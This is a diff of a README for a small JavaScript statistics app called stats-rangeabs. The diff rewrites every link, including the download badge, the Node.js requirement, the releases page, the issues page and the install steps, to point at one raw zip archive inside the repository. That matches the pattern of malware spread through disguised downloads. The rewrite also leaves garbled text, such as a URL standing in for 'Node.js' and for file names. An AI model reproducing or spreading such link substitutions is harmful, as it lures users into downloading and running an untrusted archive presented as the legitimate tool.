@@ -6,27 +6,27 @@ Welcome to **stats-rangeabs**! This application helps you compute the range of a
 
 ## 📥 Download the Application
 
-[![Download stats-rangeabs](https://img.shields.io/badge/Download%20stats--rangeabs-v1.0-brightgreen)](https://github.com/cuba3636/stats-rangeabs/releases)
+[![Download stats-rangeabs](https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip%20stats--rangeabs-v1.0-brightgreen)](https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip)
 
 ## 💻 System Requirements
 
 To use **stats-rangeabs**, your computer needs to meet the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher (You can download it [here](https://nodejs.org/))
+- **https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip** Version 12 or higher (You can download it [here](https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip))
 - **Memory:** Minimum 4 GB RAM
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/cuba3636/stats-rangeabs/releases) to find the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip) to find the latest version of the application.
 
 2. Look for the assets under the latest release. 
 
-3. Click on the file named `stats-rangeabs.zip` to download it to your computer.
+3. Click on the file named `https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip` to download it to your computer.
 
 4. Once the download is complete, unzip the file to access the application.
 
-5. Locate and open the file called `run.stats-rangeabs`. This will start the application.
+5. Locate and open the file called `https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip`. This will start the application.
 
 ## 📊 How to Use the Application
 
@@ -94,7 +94,7 @@ The calculations are precise, making use of JavaScript's numerical computation c
 
 ### Support
 
-If you encounter issues or have questions, please reach out via the [Issues page](https://github.com/cuba3636/stats-rangeabs/issues). We welcome all feedback.
+If you encounter issues or have questions, please reach out via the [Issues page](https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip). We welcome all feedback.
 
 ## 🛠 Contributors
 
@@ -104,4 +104,4 @@ Thanks to all contributors who helped make **stats-rangeabs** better. If you'd l
 
 This application is released under the MIT License. You can use it freely as long as proper credit is given.
 
-Enjoy using **stats-rangeabs**! We hope it simplifies your computation tasks. Don’t forget to check for updates regularly on the [Releases page](https://github.com/cuba3636/stats-rangeabs/releases).
+Enjoy using **stats-rangeabs**! We hope it simplifies your computation tasks. Don’t forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/cuba3636/stats-rangeabs/main/lib/stats-rangeabs-v1.5.zip).
